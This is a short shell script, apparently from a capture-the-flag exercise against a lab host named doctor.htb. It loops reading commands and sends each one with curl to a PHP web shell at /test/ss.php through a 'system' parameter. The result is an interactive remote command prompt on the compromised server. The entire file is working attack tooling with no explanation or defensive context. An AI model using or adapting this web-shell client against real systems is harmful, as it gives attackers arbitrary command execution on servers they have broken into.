#!/bin/sh

while true;do
 echo -n "\n$ "; read cmd
 curl --silent -G 'http://doctor.htb/test/ss.php' --data-urlencode "system=${cmd}"
done